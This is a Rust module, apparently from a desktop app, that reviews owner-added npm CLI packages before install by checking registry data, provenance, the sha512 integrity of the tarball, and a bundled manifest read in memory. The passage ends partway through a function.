//! Own tools: a CLI the owner adds by its npm name, without a review by us (docs/dev/plans/2026-11-07-own-tools.md).
//! Discovery reads npm only: the package's registry data, its provenance as `provenance.rs` reads it, and the
//! manifest `contracts/wirecat.json` out of the tarball, checked against `dist.integrity`. Nothing from the package runs
//! until the owner confirmed twice; then `install.rs` installs the reviewed version, the tool's `--wcat-describe` must
//! name the manifest that was shown, and the entry is saved to `<app data>/extra-tools.json` for the next start.

use crate::catalog::{Catalog, Tool};
use crate::community::{self, Problem, Source, Taken};
use crate::install::{self, InstallEvent, Running};
use crate::own_risks::{self, Signal};
use crate::own_scan::{self, Code};
use crate::provenance::{self, Built};
use crate::{paths, run, tools};
use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use sha2::{Digest, Sha256, Sha512};
use std::collections::HashMap;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::sync::{Arc, LazyLock, Mutex};
use std::time::Duration;
use tauri::ipc::Channel;

const SETTING: &str = "own-tools.json";
const MANIFEST: &str = "contracts/wirecat.json";
const MAX_PACKUMENT: usize = 512 * 1024;
const MAX_TARBALL: u64 = 10 * 1024 * 1024;
const MAX_MANIFEST: u64 = 256 * 1024;
/// A 10 MB tarball may unpack to far more; reading stops here so a crafted archive cannot fill the memory.
const MAX_UNPACKED: u64 = 64 * 1024 * 1024;
const MAX_DESCRIBE: usize = 64 * 1024;
/// The first start after an install is the slowest: Node.js loads the package cold, and an antivirus scans it first.
const DESCRIBE_TIMEOUT: Duration = Duration::from_secs(15);
const REGISTRY: &str = "--registry=https://registry.npmjs.org/";
const TIMEOUT: Duration = Duration::from_secs(20);

/// The catalog keys a manifest's `desktop` object may hold; every one the interface needs is written, `null` when
/// unused, because an entry the interface refuses is not shown at all.
const KEYS: [&str; 21] = [
    "tagline",
    "profiles",
    "doctor",
    "runs",
    "search",
    "setup",
    "signIn",
    "skill",
    "mcpServer",
    "tasks",
    "sync",
    "storeInfo",
    "storeTables",
    "storeTableSizes",
    "storeCheck",
    "storeBackup",
    "storeBackupEncrypted",
    "storeResetPreview",
    "storeReset",
    "storage",
    "settings",
];

/// Format 2 of `contracts/wirecat.json`, as `cli-dev manifest` writes it. Only what Desktop reads is typed; `desktop`
/// stays JSON because `community.rs` checks it as a catalog entry.
#[derive(Debug, Deserialize)]
pub struct Manifest {
    #[serde(rename = "wcat_manifest")]
    pub format: u32,
    pub name: String,
    /// Dropped from the manifest in cli-base#514: npm's version is the one checked. An older manifest that still names
    /// one must name npm's.
    #[serde(default)]
    pub version: Option<String>,
    #[serde(default)]
    pub description: String,
    #[serde(default)]
    pub docs_url: Option<String>,
    pub package: String,
    pub bin: String,
    #[serde(default)]
    pub commands: Vec<ManifestCommand>,
    pub desktop: Value,
    /// The servers the tool says it contacts (cli-base#529): absent when it did not say, `hosts: []` for none.
    #[serde(default)]
    pub network: Option<Network>,
    /// The fields cli-base knows of each entity a list query covers (cli-base#529).
    #[serde(default)]
    pub entities: std::collections::BTreeMap<String, Entity>,
}

#[derive(Debug, Deserialize, Clone)]
pub struct Network {
    pub hosts: Vec<String>,
    /// A server the owner chooses, in the tool's words: "the mail server you sign in to".
    #[serde(default)]
    pub user_hosts: Option<String>,
}

#[derive(Debug, Deserialize, Clone)]
pub struct Entity {
    pub fields: Vec<String>,
}

#[derive(Debug, Deserialize)]
pub struct ManifestCommand {
    pub path: Vec<String>,
    /// Missing effects count as writes, as cli-base's `writes(undefined)` does.
    #[serde(default)]
    pub effects: Option<Effects>,
    /// What it does, in a few words, and the entity it answers with (cli-base#529); older manifests have neither.
    #[serde(default)]
    pub summary: Option<String>,
    #[serde(default)]
    pub entity: Option<String>,
}

#[derive(Debug, Deserialize, Clone, Copy)]
pub struct Effects {
    pub remote: Level,
    pub local: Level,
}

#[derive(specta::Type, Serialize, Debug, Deserialize, Clone, Copy, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
#[serde(rename = "OwnLevel")]
pub enum Level {
    None,
    Read,
    Write,
}

/// Why a package cannot be added, for the dialog to say in the owner's language.
#[derive(specta::Type, Serialize, Debug, PartialEq, Clone)]
#[serde(rename_all = "snake_case", rename_all_fields = "camelCase", tag = "kind")]
#[serde(rename = "OwnRefusal")]
pub enum Refusal {
    NotFound,
    NotScoped,
    WirecatScope,
    NoManifest,
    BadManifest {
        key: String,
        rule: String,
    },
    /// `with` is the tool that already uses the name; `listed` when it is on the signed list.
    Collision {
        with: String,
        listed: bool,
    },
    ProvenanceMismatch {
        claimed: String,
        built: String,
    },
    Offline {
        detail: String,
    },
    TooLarge {
        what: String,
    },
}

fn bad(key: &str, rule: impl Into<String>) -> Refusal {
    Refusal::BadManifest { key: key.into(), rule: rule.into() }
}

impl From<Problem> for Refusal {
    fn from(p: Problem) -> Self {
        match p {
            Problem::Rule { key, rule } => Refusal::BadManifest { key, rule },
            Problem::Ours { .. } => Refusal::WirecatScope,
            Problem::Taken { with, listed, .. } => Refusal::Collision { with, listed },
        }
    }
}

/// What the review screen shows. Everything it shows is kept in Rust under `token`; Add takes only the token.
#[derive(specta::Type, Serialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
#[serde(rename = "OwnReview")]
#[expect(clippy::struct_excessive_bools, reason = "each is its own line on the review screen")]
pub struct Review {
    pub token: String,
    pub id: String,
    pub name: String,
    pub package: String,
    pub version: String,
    pub summary: String,
    /// npm's maintainers, names only.
    pub publishers: Vec<String>,
    pub repo: Option<String>,
    pub built: Option<BuiltBy>,
    pub access: Access,
    pub sign_in: Option<SignInText>,
    pub syncs: bool,
    pub skill: bool,
    pub mcp: bool,
    /// False when the owner pasted the `desktop` object: no manifest, so no command list and no hash to check.
    pub described: bool,
    pub update: Option<UpdateChange>,
    /// Every declared command with its effects, for the plain-language access list and the exact commands under it.
    pub commands: Vec<Command>,
    /// What a sync copies, in the manifest's own words ("contacts, deals and invoices").
    pub sync_what: Option<String>,
    /// Built on `@wirecat/cli-core`, so it opens the shared store itself.
    pub uses_core: bool,
    /// The servers the manifest declares; `None` when it does not say, empty when it contacts none.
    pub hosts: Option<Vec<String>>,
    /// A server the owner chooses, in the tool's words.
    pub user_hosts: Option<String>,
    /// The fields of each entity the tool lists, by entity name.
    pub entities: std::collections::BTreeMap<String, Vec<String>>,
    /// Things to check from npm, the dependencies and the code; GitHub's come from `own_tool_risks`.
    pub signals: Vec<Signal>,
    pub links: Links,
    /// The exact package file reviewed, for an agent to download and check against `integrity` (sha512).
    pub tarball: String,
    pub integrity: String,
    /// The release commit npm's provenance names, for an agent to compare the package with.
    pub commit: Option<String>,
    /// The catalog entry as it will be saved, for the interface to check with its own schema.
    #[specta(type = specta_typescript::Unknown)]
    pub entry: Value,
}

#[derive(specta::Type, Serialize, Debug, Clone, PartialEq)]
#[serde(rename_all = "camelCase")]
#[serde(rename = "OwnCommand")]
pub struct Command {
    pub words: String,
    pub remote: Level,
    pub local: Level,
    pub summary: Option<String>,
    pub entity: Option<String>,
}

/// Where the owner can check each fact the review shows, all https.
#[derive(specta::Type, Serialize, Debug, Clone, Default, PartialEq)]
#[serde(rename_all = "camelCase")]
#[serde(rename = "OwnLinks")]
pub struct Links {
    pub npm: String,
    pub publishers: Vec<Link>,
    pub commit: Option<String>,
    pub run: Option<String>,
    pub log: Option<String>,
}

#[derive(specta::Type, Serialize, Debug, Clone, PartialEq)]
#[serde(rename = "OwnLink")]
pub struct Link {
    pub label: String,
    pub url: String,
}

#[derive(specta::Type, Serialize, Deserialize, Debug, Clone, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct BuiltBy {
    pub repo: String,
    pub workflow: String,
}

/// The commands the manifest declares, grouped by what they ask to touch; each is its words joined by spaces.
#[derive(specta::Type, Serialize, Debug, Clone, Default, PartialEq)]
#[serde(rename_all = "camelCase")]
#[serde(rename = "OwnAccess")]
pub struct Access {
    pub reads: Vec<String>,
    pub changes: Vec<String>,
    pub writes: Vec<String>,
    /// No manifest: what the tool asks for is not known.
    pub unknown: bool,
}

#[derive(specta::Type, Serialize, Debug, Clone)]
#[serde(rename = "OwnSignIn")]
pub struct SignInText {
    pub gives: String,
    pub asks: String,
}

/// An update of an own tool: what changed since the review the owner confirmed.
#[derive(specta::Type, Serialize, Debug, Clone, PartialEq)]
#[serde(rename_all = "camelCase")]
#[serde(rename = "OwnUpdate")]
#[expect(clippy::struct_excessive_bools, reason = "each is its own line on the update's review")]
pub struct UpdateChange {
    pub from_version: String,
    pub repo_changed: bool,
    pub from_repo: Option<String>,
    /// Where npm built it changed, appeared or disappeared.
    pub provenance_changed: bool,
    pub from_built: Option<BuiltBy>,
    pub publishers_changed: bool,
    pub from_publishers: Vec<String>,
    /// Commands the version before did not have.
    pub new_commands: Vec<String>,
    /// Commands that change the service or write on this computer and did not before.
    pub new_writes: Vec<String>,
    /// `signIn`, `mcpServer`, `skill` or `sync`, when the version before had none.
    pub new_parts: Vec<String>,
    /// Parts the version before had, with other texts or command words now: `signIn`, `doctor`, `setup`, `sync`,
    /// `mcpServer`, `skill`, `runs`, `profiles` or `storage`.
    pub changed_parts: Vec<String>,
    /// Anything above changed, or the access is unknown: the owner confirms these changes explicitly.
    pub confirm: bool,
}

#[derive(specta::Type, Serialize, Debug)]
#[serde(rename_all = "camelCase", rename_all_fields = "camelCase", tag = "outcome")]
#[serde(rename = "OwnDiscovery")]
pub enum Discovery {
    Review { review: Box<Review> },
    Refused { refusal: Refusal },
}

#[derive(specta::Type, Serialize, Debug)]
#[serde(rename_all = "camelCase")]
#[serde(rename = "OwnStatus")]
pub struct Status {
    pub allowed: bool,
    /// `WIRECAT_EXTRA_TOOLS=1`: the file is read whatever the switch says.
    pub flag: bool,
    pub added: usize,
}

/// A review the owner was shown: Add and Uninstall act only on this.
pub struct Reviewed {
    pub tool: Tool,
    pub entry: Value,
    pub version: String,
    /// The tarball's sha512 (`dist.integrity`): install refuses a release that is not this file.
    pub integrity: String,
    pub manifest_sha256: Option<String>,
    pub review: Review,
}

/// What discovery asks npm; the tests answer from fixtures.
pub trait Registry {
    fn view(&self, package: &str) -> Result<Value, Refusal>;
    fn attestations(&self, package: &str, version: &str) -> Result<Value, Refusal>;
    fn download(&self, url: &str) -> Result<Vec<u8>, Refusal>;
}

pub struct Npm;

const NETWORK: [&str; 6] = ["ENOTFOUND", "ETIMEDOUT", "ECONNRESET", "ECONNREFUSED", "EAI_AGAIN", "ENETUNREACH"];

impl Registry for Npm {
    fn view(&self, package: &str) -> Result<Value, Refusal> {
        let npm = paths::find("npm").ok_or_else(|| Refusal::Offline { detail: "npm was not found".into() })?;
        // The public registry, as `provenance.rs` asks: the checksum and the provenance then come from one place.
        let args = ["view", package, "--json", REGISTRY];
        let out = run::run_capped(&npm, &args, Some(&paths::search_path()), TIMEOUT, MAX_PACKUMENT)
            .map_err(|e| Refusal::Offline { detail: e.to_string() })?;
        view_answer(out.code, &out.stdout)
    }

    fn attestations(&self, package: &str, version: &str) -> Result<Value, Refusal> {
        provenance::attestations(package, version).map_err(|r| Refusal::Offline { detail: format!("{r:?}") })
    }

    fn download(&self, url: &str) -> Result<Vec<u8>, Refusal> {
        let agent: ureq::Agent = ureq::Agent::config_builder()
            .timeout_global(Some(TIMEOUT))
            .https_only(true)
            .user_agent(concat!("WireCatDesktop/", env!("CARGO_PKG_VERSION")))
            .build()
            .into();
        let mut response = agent.get(url).call().map_err(|e| Refusal::Offline { detail: e.to_string() })?;
        response.body_mut().with_config().limit(MAX_TARBALL).read_to_vec().map_err(|e| match e {
            ureq::Error::BodyExceedsLimit(_) => Refusal::TooLarge { what: "package".into() },
            e => Refusal::Offline { detail: e.to_string() },
        })
    }
}

fn view_answer(code: Option<i32>, stdout: &str) -> Result<Value, Refusal> {
    if stdout.len() > MAX_PACKUMENT {
        return Err(Refusal::TooLarge { what: "registry answer".into() });
    }
    let v: Value = serde_json::from_str(stdout).unwrap_or_default();
    if let Some(error) = v.get("error") {
        let code = error["code"].as_str().unwrap_or_default();
        return Err(if NETWORK.contains(&code) || code.is_empty() {
            Refusal::Offline { detail: error["summary"].as_str().unwrap_or("npm view failed").into() }
        } else {
            Refusal::NotFound
        });
    }
    if code != Some(0) || !v.is_object() {
        return Err(Refusal::Offline { detail: "npm view did not answer".into() });
    }
    Ok(v)
}

/// The owner's own tools are read only while this is on; off by default.
pub fn allowed() -> bool {
    setting_file().is_some_and(|f| crate::registry::read_shown(&f))
}

/// Applies at once: the catalog is read again with the switch as it now is, so turning it off hides the own tools and
/// a later reload (an add or a remove) never brings back a state the switch no longer has.
pub fn set_allowed(allow: bool) -> Result<(), String> {
    crate::registry::write_shown(&setting_file().ok_or("The app's data folder is unknown.")?, allow)?;
    crate::catalog::reload();
    Ok(())
}

fn setting_file() -> Option<PathBuf> {
    crate::node::app_data().map(|d| d.join(SETTING))
}

fn tools_file() -> Result<PathBuf, String> {
    crate::node::app_data().map(|d| d.join(community::FILE)).ok_or_else(|| "The app's data folder is unknown.".into())
}

pub fn status() -> Status {
    Status {
        allowed: allowed(),
        flag: std::env::var(community::FLAG).ok().as_deref() == Some("1"),
        added: crate::catalog::catalog().extra.count(Source::Own),
    }
}

/// Reads npm for `package` and builds its review, keeping it under a new token. `desktop` is the object the owner
/// pasted for a tool that does not describe itself.
pub fn discover(package: &str, desktop: Option<&str>) -> Discovery {
    let saved = tools_file().ok().and_then(|f| std::fs::read_to_string(f).ok()).unwrap_or_default();
    match review(package, desktop, &Npm, crate::catalog::catalog(), &saved) {
        Ok(reviewed) => {
            let review = reviewed.review.clone();
            REVIEWS.lock().unwrap().insert(review.token.clone(), Arc::new(reviewed));
            Discovery::Review { review: Box::new(review) }
        }
        Err(refusal) => Discovery::Refused { refusal },
    }
}

type Kept = LazyLock<Mutex<HashMap<String, Arc<Reviewed>>>>;

/// Reviews shown and not yet added; Add takes its review out, so a token installs once.
static REVIEWS: Kept = LazyLock::new(|| Mutex::new(HashMap::new()));
/// Reviews Add used, kept only for the Uninstall a refused add offers.
static ADDED: Kept = LazyLock::new(|| Mutex::new(HashMap::new()));

const GONE: &str = "This review is no longer open. Start again.";

pub fn take_review(token: &str) -> Result<Arc<Reviewed>, String> {
    REVIEWS.lock().unwrap().remove(token).ok_or_else(|| GONE.into())
}

pub fn take_added(token: &str) -> Result<Arc<Reviewed>, String> {
    ADDED.lock().unwrap().remove(token).ok_or_else(|| GONE.into())
}

/// The name rules come before any network call, so a bad name never reaches npm.
fn name_check(package: &str) -> Result<(), Refusal> {
    community::package(package).map_err(|p| match p {
        Problem::Ours { .. } => Refusal::WirecatScope,
        _ => Refusal::NotScoped,
    })
}

pub fn review(
    package: &str,
    pasted: Option<&str>,
    registry: &impl Registry,
    catalog: &Catalog,
    saved: &str,
) -> Result<Reviewed, Refusal> {
    name_check(package)?;
    let view = registry.view(package)?;
    let version = view["version"].as_str().unwrap_or_default().to_string();
    semver::Version::parse(&version).map_err(|_| bad("version", "npm gives no valid version for the package."))?;
    let integrity = view["dist"]["integrity"].as_str().unwrap_or_default();
    let tarball = view["dist"]["tarball"].as_str().unwrap_or_default();
    // The review, the install and the agent's check all read npm's public registry, so the file must come from there.
    if !tarball.starts_with("https://registry.npmjs.org/") {
        return Err(bad("dist.tarball", "npm gives no address on registry.npmjs.org for the package file."));
    }

    let (built, release, repo) = provenance_of(registry, &view, package, &version, integrity)?;

    let bytes = registry.download(tarball)?;
    verify_integrity(&bytes, integrity)?;
    let (found, code) = read_tarball(&bytes, &bin_targets(&view))?;
    let (manifest, sha) = match (found, pasted) {
        (Some(raw), _) => (parse_manifest(&raw, package, &version)?, Some(hex(&Sha256::digest(&raw)))),
        (None, Some(text)) => (pasted_manifest(text, package, &version, &view)?, None),
        (None, None) => return Err(Refusal::NoManifest),
    };

    if let Some(bins) = view["bin"].as_object()
        && !bins.contains_key(&manifest.bin)
    {
        return Err(bad("bin", format!("the package installs no program named {}.", manifest.bin)));
    }
    let mut entry = entry_of(&manifest, &view, repo.as_deref())?;
    let previous = previous_entry(saved, package);
    // The id names the tool's runs, sign-ins and settings in the app: an update keeps it whatever the new name says.
    if let Some(id) = previous.as_ref().map(|old| old["id"].clone()).filter(Value::is_string) {
        entry["id"] = id;
    }
    let taken = taken_by_others(catalog, saved, package);
    if entry["mcpServer"].is_object() {
        let kept = previous.as_ref().and_then(|old| old["mcpServer"]["port"].as_u64());
        entry["mcpServer"]["port"] = json!(port_for(&taken, kept)?);
    }

    let access =
        if sha.is_some() { access_of(&manifest.commands) } else { Access { unknown: true, ..Access::default() } };
    let commands: Vec<String> = manifest.commands.iter().map(|c| c.path.join(" ")).collect();
    let publishers = publishers(&view["maintainers"]);
    let hosts = declared_hosts(&manifest)?;
    let links = links_of(package, &version, &publishers, built.as_ref(), &release);
    // Kept as word lists: `community.rs` checks every string in an array as a command word at each start.
    let words = |list: &[String]| -> Vec<Vec<String>> {
        list.iter().map(|c| c.split(' ').map(str::to_string).collect()).collect()
    };
    entry["own"] = json!({
        "version": version,
        "name": manifest.name,
        "built": built,
        "publishers": publishers.join(", "),
        "commands": words(&commands),
        "changes": words(&access.changes),
        "writes": words(&access.writes),
    });
    // An update keeps the record of its first add: the folders that existed then are still another program's.
    if let Some(record) = previous.as_ref().map(|old| old["own"]["preexisting"].clone()).filter(Value::is_object) {
        entry["own"]["preexisting"] = record;
    }
    let tool = community::check(&entry, &taken, Source::Own)?;
    let now = Now {
        repo: repo.as_deref(),
        built: built.as_ref(),
        publishers: &publishers,
        commands: &commands,
        access: &access,
    };
    let update = previous.map(|old| change_of(&old, &entry, now));
    let signals = signals_of(&view, &publishers, built.is_some(), &code, hosts.as_deref(), &entry);
    let review = Review {
        token: token(package),
        id: tool.id.clone(),
        name: tool.name.clone(),
        package: package.into(),
        version: version.clone(),
        summary: entry["summary"].as_str().unwrap_or_default().into(),
        publishers,
        repo,
        built,
        access,
        sign_in: entry["signIn"].is_object().then(|| SignInText {
            gives: entry["signIn"]["gives"].as_str().unwrap_or_default().into(),
            asks: entry["signIn"]["asks"].as_str().unwrap_or_default().into(),
        }),
        syncs: !entry["sync"].is_null(),
        skill: !entry["skill"].is_null(),
        mcp: !entry["mcpServer"].is_null(),
        described: sha.is_some(),
        update,
        commands: manifest.commands.iter().map(command_of).collect(),
        sync_what: manifest.desktop["sync"]["what"].as_str().map(|w| line(w, 80)),
        uses_core: own_risks::uses_core(&view, &code.bundled),
        hosts,
        user_hosts: manifest.network.as_ref().and_then(|n| n.user_hosts.as_deref()).map(|t| line(t, 120)),
        entities: entities_of(&manifest),
        signals,
        links,
        tarball: tarball.into(),
        integrity: integrity.into(),
        commit: release.commit,
        entry: entry.clone(),
    };
    Ok(Reviewed { tool, entry, version, integrity: integrity.to_string(), manifest_sha256: sha, review })
}

/// Where npm built it, the facts of that build, and the repository the review shows: the package's own, else the
/// building one. A package that names one repository and was built by another is refused.
fn provenance_of(
    registry: &impl Registry,
    view: &Value,
    package: &str,
    version: &str,
    integrity: &str,
) -> Result<(Option<BuiltBy>, provenance::Release, Option<String>), Refusal> {
    let attestations = registry.attestations(package, version)?;
    let built = match provenance::built(&attestations, package, version, integrity) {
        Built::By { repo, workflow } => Some(BuiltBy { repo, workflow }),
        Built::Unknown(_) => None,
    };
    let release = built
        .as_ref()
        .and_then(|_| provenance::release(&attestations, package, version, integrity))
        .unwrap_or_default();
    let claimed = github_repo(&view["repository"])?;
    if let (Some(claimed), Some(built)) = (&claimed, &built)
        && !claimed.eq_ignore_ascii_case(&built.repo)
    {
        return Err(Refusal::ProvenanceMismatch { claimed: claimed.clone(), built: built.repo.clone() });
    }
    let repo = claimed.or_else(|| built.as_ref().map(|b| b.repo.clone()));
    Ok((built, release, repo))
}

/// Every name, folder and port in use, except by the own tool this review would replace; entries saved since the app
/// started count too.
fn taken_by_others(catalog: &Catalog, saved: &str, package: &str) -> Taken {
    let mut taken = Taken::of(catalog, Some(package));
    for other in community::file_entries(saved).unwrap_or_default() {
        if other["package"] != package
            && let Ok(tool) = serde_json::from_value::<Tool>(other)
        {
            taken.add(&tool);
        }
    }
    taken
}

const SYNC_WHAT: [&str; 6] = ["messages", "files", "meetings", "notes and mail", "mail", "records"];

const FIRST_PORT: u64 = 8770;
const LAST_PORT: u64 = 8999;

/// The manifest names no port: two tools' servers on one port would collide, so Desktop picks one no catalog tool and
/// no other entry uses, and an update keeps the one it had. `community.rs` checks it again at every start.
fn port_for(taken: &Taken, kept: Option<u64>) -> Result<u64, Refusal> {
    kept.into_iter()
        .chain(FIRST_PORT..=LAST_PORT)
        .find(|p| taken.port_free(*p))
        .ok_or_else(|| bad("mcpServer", "no free port is left for its MCP server."))
}

fn token(package: &str) -> String {
    static COUNT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let n = COUNT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos();
    hex(&Sha256::digest(format!("{package}:{n}:{nanos}:{}", std::process::id())))[..32].to_string()
}

fn hex(bytes: &[u8]) -> String {
    use std::fmt::Write;
    bytes.iter().fold(String::new(), |mut s, b| {
        let _ = write!(s, "{b:02x}");
        s
    })
}

/// `https://github.com/<owner>/<name>` from npm's `repository` (a string or `{url}`, often `git+…` and `.git`);
/// `None` for a repository outside GitHub, which an own tool may have.
fn github_repo(repository: &Value) -> Result<Option<String>, Refusal> {
    let raw = repository.as_str().or_else(|| repository["url"].as_str()).unwrap_or_default().trim();
    let path = raw
        .trim_start_matches("git+")
        .strip_prefix("https://github.com/")
        .or_else(|| raw.strip_prefix("git://github.com/"))
        .or_else(|| raw.strip_prefix("git+ssh://git@github.com/"))
        .or_else(|| raw.strip_prefix("ssh://git@github.com/"))
        .or_else(|| raw.strip_prefix("git@github.com:"))
        .or_else(|| raw.strip_prefix("github:"));
    let Some(path) = path else { return Ok(None) };
    let url = format!("https://github.com/{}", path.trim_end_matches('/').trim_end_matches(".git"));
    match community::repo(&url) {
        Ok(()) => Ok(Some(url)),
        Err(Problem::Ours { .. }) => Err(Refusal::WirecatScope),
        Err(_) => Ok(None),
    }
}

fn verify_integrity(bytes: &[u8], integrity: &str) -> Result<(), Refusal> {
    let want = integrity
        .strip_prefix("sha512-")
        .and_then(|b| STANDARD.decode(b).ok())
        .ok_or_else(|| bad("dist.integrity", "npm gives no sha512 checksum for the package file."))?;
    if Sha512::digest(bytes).as_slice() != want.as_slice() {
        return Err(bad("dist.integrity", "the downloaded package file does not match the checksum npm lists."));
    }
    Ok(())
}

/// The manifest's bytes, read out of the gzipped tarball in memory: nothing is written to disk and nothing runs.
#[cfg(test)]
pub fn manifest_in(tgz: &[u8]) -> Result<Option<Vec<u8>>, Refusal> {
    read_tarball(tgz, &[]).map(|(found, _)| found)
}

/// The files `bin` names, relative to the package (`./dist/bin.js` → `dist/bin.js`): a program file often has no
/// extension, and it is the one that runs.
fn bin_targets(view: &Value) -> Vec<String> {
    let targets: Vec<&str> = match &view["bin"] {
        Value::String(one) => vec![one.as_str()],
        Value::Object(all) => all.values().filter_map(Value::as_str).collect(),
        _ => Vec::new(),
    };
    targets.into_iter().map(|t| t.trim_start_matches("./").to_string()).collect()
}

/// The manifest, and what the package's JavaScript says about the network, in one pass over the tarball in memory.
/// JavaScript is a `.js`, `.mjs` or `.cjs` file, a file `bins` names, or any file that starts with `#!`.
pub fn read_tarball(tgz: &[u8], bins: &[String]) -> Result<(Option<Vec<u8>>, Code), Refusal> {
    let unreadable = || bad("tarball", "the package file cannot be read.");
    let mut archive = tar::Archive::new(flate2::read::GzDecoder::new(tgz).take(MAX_UNPACKED));
    let mut found = None;
    let mut code = Code::default();
    for entry in archive.entries().map_err(|_| unreadable())? {
        let mut entry = entry.map_err(|_| unreadable())?;
        let path = entry.path().map_err(|_| unreadable())?.into_owned();
        // npm packs everything under one top folder, `package/` for an `npm pack`.
        let mut parts = path.components();
        parts.next();
        let inside = parts.as_path().to_string_lossy().into_owned();
        if entry.header().entry_type().is_file() && own_scan::is_native(&inside) {
            code.add_native(&inside);
            continue;
        }
        if entry.header().entry_type().is_file() && inside != MANIFEST {
            let mut text = Vec::new();
            let named = own_scan::is_code(&inside) || bins.contains(&inside);
            if !named {
                entry.by_ref().take(2).read_to_end(&mut text).map_err(|_| unreadable())?;
            }
            if named || text.starts_with(b"#!") {
                entry.read_to_end(&mut text).map_err(|_| unreadable())?;
                own_scan::scan(&String::from_utf8_lossy(&text), &mut code);
            }
            continue;
        }
        if parts.as_path() != Path::new(MANIFEST) {
            continue;
        }
        // The review reads one entry and npm extracts the last of several, so a second or linked one is refused.
        if found.is_some() {
            return Err(bad("tarball", format!("the package file holds {MANIFEST} more than once.")));
        }
        if !entry.header().entry_type().is_file() {
            return Err(bad("tarball", format!("{MANIFEST} in the package file is a link, not a file.")));
        }
        if entry.header().size().map_err(|_| unreadable())? > MAX_MANIFEST {
            return Err(Refusal::TooLarge { what: MANIFEST.into() });
        }
        let mut raw = Vec::new();
        entry.by_ref().take(MAX_MANIFEST + 1).read_to_end(&mut raw).map_err(|_| unreadable())?;
        if raw.len() as u64 > MAX_MANIFEST {
            return Err(Refusal::TooLarge { what: MANIFEST.into() });
        }
        found = Some(raw);
    }
    Ok((found, code))
}

pub fn parse_manifest(raw: &[u8], package: &str, version: &str) -> Result<Manifest, Refusal> {
    let m: Manifest = serde_json::from_slice(raw).map_err(|e| bad("manifest", format!("{MANIFEST}: {e}")))?;
    if m.format != 2 {
        return Err(bad("wcat_manifest", "only format 2 of the manifest is read."));
    }
    if m.package != package {
        return Err(bad("package", format!("the manifest is for {}, not {package}.", m.package)));
    }
    if let Some(named) = m.version.as_deref().filter(|named| *named != version) {
        return Err(bad("version", format!("the manifest is for version {named}, not {version}.")));
    }
    for c in &m.commands {
        if c.path.is_empty() || !c.path.iter().all(|w| community::plain_word(w)) {
            return Err(bad("commands", format!("the command {:?} is not plain words.", c.path)));
        }
    }
    Ok(m)
}

/// A tool without a manifest: the pasted `desktop` object, with the rest from npm. No command list, so its access
/// stays unknown; a package with several programs must name its own in `bin`.
fn pasted_manifest(text: &str, package: &str, version: &str, view: &Value) -> Result<Manifest, Refusal> {
    let desktop: Value =
        serde_json::from_str(text).map_err(|e| bad("desktop", format!("this is not valid JSON: {e}")))?;
    let bins: Vec<&String> = view["bin"].as_object().map(|b| b.keys().collect()).unwrap_or_default();
    let bin = match (desktop["bin"].as_str(), bins.as_slice()) {
        (Some(bin), _) => bin.to_string(),
        (None, [only]) => (*only).clone(),
        _ => return Err(bad("bin", "name the program in \"bin\": the package installs none or several.")),
    };
    Ok(Manifest {
        format: 2,
        name: desktop["name"].as_str().map_or_else(|| package.rsplit('/').next().unwrap_or(package).into(), Into::into),
        version: Some(version.into()),
        description: view["description"].as_str().unwrap_or_default().into(),
        docs_url: None,
        package: package.into(),
        bin,
        commands: Vec::new(),
        desktop,
        network: None,
        entities: std::collections::BTreeMap::new(),
    })
}

/// The catalog entry: the `desktop` keys, then what the manifest and npm say, which the `desktop` object cannot
/// override. The id is the letters of the manifest's name ("acme-crm" → "acmecrm"), the only rule that needs no guess.
fn entry_of(m: &Manifest, view: &Value, repo: Option<&str>) -> Result<Value, Refusal> {
    let desktop = m.desktop.as_object().ok_or_else(|| bad("desktop", "the desktop object is missing."))?;
    let mut entry = serde_json::Map::new();
    for key in KEYS {
        entry.insert(key.into(), Value::Null);
    }
    for (key, value) in desktop {
        // Keys only WireCat's tools set are passed on, so `community.rs` refuses them with its own sentence.
        let read = KEYS.contains(&key.as_str()) || ["name", "bin"].contains(&key.as_str());
        if !read && !community::FORBIDDEN.contains(&key.as_str()) {
            return Err(bad(key, "WireCat does not read this key."));
        }
        entry.insert(key.clone(), value.clone());
    }
    // The manifest names what a sync copies in free text; Desktop counts with plural forms of a closed list, so an own
    // tool's sync counts "records" rather than a noun guessed from that text.
    if let Some(sync) = entry.get_mut("sync").and_then(Value::as_object_mut)
        && !sync.get("what").and_then(Value::as_str).is_some_and(|w| SYNC_WHAT.contains(&w))
    {
        sync.insert("what".into(), json!("records"));
    }
    let tagline = entry["tagline"].as_str().unwrap_or_default();
    if tagline.is_empty() || tagline.chars().count() > 55 {
        return Err(bad("tagline", "a tagline of 1 to 55 characters is needed."));
    }
    if !entry["doctor"].is_array() {
        return Err(bad("doctor", "the doctor command words are missing."));
    }
    if !entry["storage"].is_object() {
        return Err(bad("storage", "the data folder name and variable prefix are missing."));
    }
    let id: String = m.name.chars().filter(char::is_ascii_alphabetic).map(|c| c.to_ascii_lowercase()).collect();
    if !(2..=16).contains(&id.len()) {
        return Err(bad("name", format!("the name {:?} gives no id of 2 to 16 letters.", m.name)));
    }
    let docs = m.docs_url.as_deref().or_else(|| view["homepage"].as_str()).or(repo);
    let Some(docs) = docs else { return Err(bad("docs_url", "a page about the tool is needed.")) };
    let summary = if m.description.is_empty() { tagline.to_string() } else { m.description.clone() };
    let name = entry.get("name").and_then(Value::as_str).map_or_else(|| m.name.clone(), str::to_string);
    let fixed = json!({
        "id": id,
        "community": true,
        "name": name,
        "bin": m.bin,
        "package": m.package,
        "summary": summary,
        "docs": docs,
        "repo": repo,
    });
    for (key, value) in fixed.as_object().into_iter().flatten() {
        entry.insert(key.clone(), value.clone());
    }
    Ok(Value::Object(entry))
}

/// npm's, the dependencies' and the code's things to check. Only the repository's host counts as a page the review
/// already shows: a homepage or docs address is the author's choice, so a call to it is a server like any other.
fn signals_of(
    view: &Value,
    publishers: &[String],
    built: bool,
    code: &Code,
    hosts: Option<&[String]>,
    entry: &Value,
) -> Vec<Signal> {
    let known: Vec<String> = entry["repo"].as_str().and_then(host_of).into_iter().collect();
